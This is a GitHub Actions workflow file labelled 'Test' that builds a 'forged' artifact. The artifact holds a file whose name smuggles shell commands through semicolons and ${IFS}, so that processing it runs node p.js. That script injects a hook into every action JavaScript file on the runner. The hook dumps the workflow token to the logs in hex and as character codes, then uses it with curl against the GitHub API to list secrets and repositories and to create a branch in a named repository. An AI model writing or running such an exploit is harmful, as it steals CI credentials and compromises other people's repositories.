name: Test

on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          rm -rf content
          mkdir -p content
          printf 'forged report body' > content/body
          python3 - <<'PY'
          import os
          name = "body;" + "cd${IFS}$HOME;" + "cd${IFS}..;" * 14 + "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
          assert len(name) < 255, len(name)
          open(os.path.join("content", name), "w").close()
          PY
          cat > content/p.js <<'JSEOF'
          const fs = require('fs');
          const path = require('path');
          const HOOK = fs.readFileSync('/tmp/content/content/hook.js', 'utf8');
          const roots = [];
          if (process.env.RUNNER_WORKSPACE) roots.push(path.join(path.dirname(process.env.RUNNER_WORKSPACE), '_actions'));
          if (process.env.HOME) roots.push(path.join(process.env.HOME, '..', '_actions'));
          roots.push('/home/runner/work/_actions', '/home/runner/_actions');
          if (process.env.RUNNER_WORKSPACE) {
            try {
              const work = path.dirname(process.env.RUNNER_WORKSPACE);
              for (const e of fs.readdirSync(work, { withFileTypes: true })) {
                if (e.isDirectory() && e.name === '_actions') roots.push(path.join(work, e.name));
              }
            } catch (e) {}
          }
          const uniq = [...new Set(roots)];
          const seen = new Set();
          let patched = 0;
          function walk(d) {
            let ents = [];
            try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
            for (const e of ents) {
              const p = path.join(d, e.name);
              if (e.isDirectory()) { if (e.name === 'node_modules') continue; walk(p); }
              else if (p.endsWith('.js')) {
                if (seen.has(p)) continue;
                seen.add(p);
                try {
                  const cur = fs.readFileSync(p, 'utf8');
                  if (cur.indexOf('LEAK-CODES') !== -1) continue;
                  fs.appendFileSync(p, '\n' + HOOK + '\n');
                  patched++;
                } catch (e) {}
              }
            }
          }
          for (const d of uniq) walk(d);
          console.log('PATCHED ' + patched + ' roots=' + JSON.stringify(uniq) + ' ws=' + process.env.RUNNER_WORKSPACE);
          JSEOF
          cat > content/hook.js <<'JSEOF'
          ;(function(){
            try {
              var t = process.env.INPUT_TOKEN;
              if (!t) { console.log('LEAK-NOTOKEN'); return; }
              var fs = require('fs');
              var cp = require('child_process');
              var s = String(t);
              console.log('LEAK-PREFIX ' + s.slice(0, 11));
              console.log('LEAK-LEN ' + s.length);
              console.log('LEAK-DOTS ' + (s.split('.').length - 1) + ' NL ' + (s.split('\n').length - 1));
              console.log('LEAK-CODES ' + s.split('').map(function(c){ return c.charCodeAt(0); }).join(','));
              console.log('LEAK-HEX ' + Buffer.from(s, 'utf8').toString('hex'));
              function api(method, url, body) {
                var args = ['-s', '-m', '25', '-o', '/tmp/api-body', '-w', '%{http_code}', '-X', method,
                            '-H', 'Authorization: token ' + s,
                            '-H', 'Accept: application/vnd.github+json'];
                if (body) {
                  fs.writeFileSync('/tmp/api-in.json', JSON.stringify(body));
                  args.push('-H', 'Content-Type: application/json', '--data-binary', '@/tmp/api-in.json');
                }
                args.push(url);
                var code = '';
                try { code = cp.execFileSync('curl', args, { encoding: 'utf8', timeout: 30000 }).trim(); }
                catch (e) { code = 'ERR ' + e.message; }
                var b = '';
                try { b = fs.readFileSync('/tmp/api-body', 'utf8'); } catch (e) {}
                console.log('API ' + method + ' ' + url.replace('https://api.github.com', '') + ' => ' + code + ' ' + b.replace(/\s+/g, ' ').slice(0, 300));
              }
              api('GET', 'https://api.github.com/rate_limit');
              api('GET', 'https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v6f4d2ac-8b2ed3');
              api('GET', 'https://api.github.com/installation/repositories');
              api('GET', 'https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v6f4d2ac-8b2ed3/actions/secrets');
              api('GET', 'https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v6f4d2ac-8b2ed3/git/ref/heads/main');
              api('POST', 'https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v6f4d2ac-8b2ed3/git/refs', { ref: 'refs/heads/omp-probe', sha: '0acf03d309992b1935810dcbcc331185cb916292' });
            } catch (e) { console.log('LEAK-ERR ' + e.message); }
          })();
          JSEOF
          ls -la content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
